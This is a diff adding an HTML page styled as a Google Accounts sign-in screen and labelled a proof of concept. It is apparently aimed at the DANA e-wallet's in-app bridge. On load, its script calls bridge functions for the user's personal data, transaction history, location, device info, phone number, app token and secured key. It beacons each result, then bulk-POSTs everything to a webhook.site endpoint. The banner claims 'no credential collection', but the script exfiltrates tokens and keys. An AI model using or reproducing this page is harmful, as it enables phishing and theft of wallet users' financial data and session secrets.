@@ -1,0 +1,74 @@
+<!DOCTYPE html><html><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in - Google Accounts (POC FULL EXFIL)</title>
+<link rel="icon" href="https://www.google.com/favicon.ico">
+<style>
+ body{font-family:Roboto,Arial,sans-serif;background:#fff;color:#202124;margin:0}
+ .banner{background:#fce8e6;color:#c5221f;text-align:center;padding:8px;font-size:11px;font-weight:bold}
+ .card{max-width:420px;margin:24px auto;border:1px solid #dadce0;border-radius:8px;padding:24px}
+ .logo{width:70px;margin:0 auto 10px;display:block}
+ pre{background:#f8f9fa;border:1px solid #eee;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:180px;overflow:auto}
+</style>
+</head><body>
+<div class="banner">⚠️ POC RESEARCH ONLY — m.dana.id@github FULL EXFIL — No credential collection</div>
+<div class="card">
+ <img class="logo" src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png">
+ <h3 style="text-align:center">Sign in <span style="font-weight:400">— POC</span></h3>
+ <pre id="log">boot... open via link.dana.id in DANA</pre>
+ <pre id="out"></pre>
+</div>
+<script>
+const WH='https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50'; // buka di PC: https://webhook.site/#!/ae24b403-f298-4923-8e42-5cb1ba6cbd50
+function beacon(o){
+  try{
+    const q='src=v16full&'+Object.entries(o).map(([k,v])=>k+'='+encodeURIComponent(String(v).slice(0,400))).join('&');
+    fetch(WH+'?'+q,{mode:'no-cors',cache:'no-store'}).catch(()=>{});
+    new Image().src=WH+'?'+q+'&img=1';
+  }catch(e){}
+}
+function setLog(t){ document.getElementById('log').textContent=t; }
+function setOut(o){ document.getElementById('out').textContent=typeof o==='string'?o:JSON.stringify(o,null,1).slice(0,8000); }
+function call(api, param, ms=15000){
+  return new Promise(res=>{
+    let done=false;
+    setTimeout(()=>{ if(!done){done=true;res({__timeout:true})}},ms);
+    try{ AlipayJSBridge.call(api,param,r=>{ if(!done){done=true;res(r)}})}catch(e){ if(!done){done=true;res({__exception:String(e)})}}
+  });
+}
+async function runFull(){
+  if(!window.AlipayJSBridge){ setLog('No bridge — open via DANA container'); beacon({stage:'noBridge'}); return; }
+  setLog('hasBridge:true — exfiltrating...');
+  beacon({stage:'boot', hasBridge:true, href:location.href.slice(0,80)});
+  const data={};
+  // parallel bridge calls — selengkap-lengkapnya
+  const calls=[
+    ['getUserInfoData',{},'pii'],
+    ['getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},'trx'],
+    ['getLocationInfo',{},'loc'],
+    ['getAkuDeviceInfo',{},'dev'],
+    ['getPhoneNumber',{},'phone'],
+    ['getUsername',{},'user'],
+    ['getAppToken',{},'token'],
+    ['getSecuredKey',{projectCode:'dana'},'key'],
+  ];
+  for(const [api,param,key] of calls){
+    try{
+      const r=await call(api,param);
+      data[key]=r;
+      setOut(data);
+      beacon({stage:key, len:JSON.stringify(r).length, head:JSON.stringify(r).slice(0,350)});
+      await new Promise(r=>setTimeout(r,400));
+    }catch(e){ data[key]={__e:String(e)} }
+  }
+  // final bulk POST via fetch (CORS no-cors, tetap sampai webhook)
+  try{
+    await fetch(WH,{method:'POST',mode:'no-cors',body:JSON.stringify({src:'v16fullBulk', data, ua:navigator.userAgent, href:location.href, ts:new Date().toISOString()})});
+  }catch(e){}
+  setLog('DONE — cek PC di https://webhook.site/#!/ae24b403-f298-4923-8e42-5cb1ba6cbd50 — semua data di atas sudah ke-beacon');
+  beacon({stage:'final', done:true});
+}
+if(window.AlipayJSBridge) runFull();
+else document.addEventListener('AlipayJSBridgeReady', runFull, false);
+setTimeout(runFull,5000);
+</script>
+</body></html>
